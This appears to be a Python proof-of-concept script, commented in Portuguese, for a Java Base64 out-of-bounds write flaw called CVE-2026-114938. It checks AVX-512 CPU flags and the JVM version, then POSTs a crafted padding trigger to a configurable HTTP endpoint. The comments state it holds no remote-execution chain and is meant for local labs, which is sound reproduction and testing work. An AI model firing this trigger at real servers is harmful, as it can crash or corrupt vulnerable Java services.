#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
java2shell_poc.py — reprodutor do PRIMITIVO publico de CVE-2026-114938
(Java2Shell / Java4Shell).

O que este script FAZ (e esta documentado, reproducivel e publico):
  - verifica as pre-condicoes locais (CPU x86-64 com AVX-512 VBMI + JVM afetada);
  - monta o gatilho publico de corrupcao de memoria (Base64 com padding);
  - envia o gatilho a um endpoint HTTP configuravel e mostra a resposta.

O que este script NAO FAZ (e nenhum codigo publico honesto faz):
  - NAO contem uma cadeia de RCE. A exploracao de OOB-write -> execucao de
    comando e especifica de aplicacao, classificada como AC:H pela Oracle,
    e o autor (Calif) MANTEM os exploits de produto em sigilo.
  - NAO transforma HTTP 500 / crash / reset em "shell provada". Isso e fraude.

Uso autorizado apenas, em laboratorio local/self-hosted. Sem alvos de terceiros.
"""

import argparse
import base64
import http.client
import platform
import re
import sys

# Gatilhos publicos documentados (ver references no README).
# JDK 21/25: 64 'A' + '='. Builds Java 17 antigos exigem 128 'A' + '='.
TRIGGERS = {
    "jdk21_25": "A" * 64 + "=",
    "jdk17": "A" * 128 + "=",
}

REQUIRED_CPU_FLAGS = ("avx512f", "avx512bw", "avx512vbmi", "bmi2")


def check_cpu():
    """Le /proc/cpuinfo (Linux) e verifica as flags AVX-512 necessarias."""
    if not platform.system().lower().startswith("linux"):
        return None, "nao-Linux: nao e possivel ler /proc/cpuinfo; verifique manualmente"
    try:
        with open("/proc/cpuinfo", "r", encoding="utf-8", errors="ignore") as fh:
            text = fh.read().lower()
    except OSError as exc:
        return None, "falha ao ler /proc/cpuinfo: %s" % exc
    m = re.search(r"^flags\s*:\s*(.+)$", text, re.MULTILINE)
    if not m:
        return None, "flags de CPU nao encontradas em /proc/cpuinfo"
    flags = set(m.group(1).split())
    missing = [f for f in REQUIRED_CPU_FLAGS if f not in flags]
    present = [f for f in REQUIRED_CPU_FLAGS if f in flags]
    if missing:
        return False, "faltam flags: %s (presentes: %s)" % (", ".join(missing), ", ".join(present) or "nenhuma")
    return True, "CPU com AVX-512 VBMI OK: %s" % ", ".join(present)


def check_local_jvm():
    """Coleta a versao da JVM local via `java -version`."""
    import subprocess
    try:
        out = subprocess.run(["java", "-version"], capture_output=True, text=True, timeout=10)
        blob = (out.stderr or out.stdout or "").strip()
        return blob.splitlines()[0] if blob else "versao nao detectada"
    except (OSError, subprocess.SubprocessError) as exc:
        return "java indisponivel: %s" % exc


def build_trigger(variant="jdk21_25"):
    payload = TRIGGERS[variant]
    # O gatilho termina com '=' "extra": Python em modo estrito rejeita esse
    # excesso de padding, entao calculamos os bytes "esperados" sem o padding.
    raw = base64.b64decode(payload.rstrip("="))
    return payload, raw


def send_trigger(host, port, path, payload, secure=False, timeout=8):
    cls = http.client.HTTPSConnection if secure else http.client.HTTPConnection
    conn = cls(host, port, timeout=timeout)
    try:
        conn.request("POST", path, body=payload.encode("ascii"),
                     headers={"Content-Type": "text/plain", "Content-Length": str(len(payload))})
        resp = conn.getresponse()
        body = resp.read(2048)
        return resp.status, resp.reason, body
    finally:
        conn.close()


def selftest(variant):
    print("[selftest] variante: %s" % variant)
    payload, raw = build_trigger(variant)
    print("[selftest] gatilho (len=%d): %r" % (len(payload), payload))
    print("[selftest] bytes decodificados (len=%d): %r" % (len(raw), raw))
    print("[selftest] pre-condition CPU:", check_cpu())
    print("[selftest] JVM local:", check_local_jvm())
    ok_cpu, _ = check_cpu()
    if ok_cpu is False:
        print("[selftest] AVISO: esta CPU nao suporta AVX-512 VBMI -> CVE nao e exploravel aqui.")
    print("[selftest] OK. Gatilho gerado. (Isto prova o PRIMITIVO, nao execucao de comando.)")


def main(argv=None):
    ap = argparse.ArgumentParser(description="Reprodutor do primitivo OOB de CVE-2026-114938")
    ap.add_argument("--variant", choices=list(TRIGGERS), default="jdk21_25")
    ap.add_argument("--host", default="127.0.0.1", help="alvo do laboratorio (default: loopback)")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--path", default="/decode")
    ap.add_argument("--https", action="store_true")
    ap.add_argument("--selftest", action="store_true", help="apenas gera/valida o gatilho localmente")
    args = ap.parse_args(argv)

    if args.selftest:
        selftest(args.variant)
        return 0

    cpu_ok, cpu_msg = check_cpu()
    print("[*] CPU:", cpu_msg)
    print("[*] JVM local:", check_local_jvm())
    if cpu_ok is False:
        print("[!] CPU sem AVX-512 VBMI: o intrinseco vulneravel nao sera usado.")

    payload, _ = build_trigger(args.variant)
    print("[*] Enviando gatilho (%s) para %s:%s%s ..." % (args.variant, args.host, args.port, args.path))
    try:
        status, reason, body = send_trigger(args.host, args.port, args.path, payload, args.https)
    except OSError as exc:
        print("[x] Falha de conexao:", exc)
        return 2
    print("[+] HTTP %s %s" % (status, reason))
    print("[+] Corpo (primeiros 512 bytes):", body[:512])
    print("[i] UM crash / 500 / reset NAO prova RCE. Para provar OOB é preciso medir bytes")
    print("    alterados apos o fim do buffer, com um controle mitigado (-XX:-UseBASE64Intrinsics).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
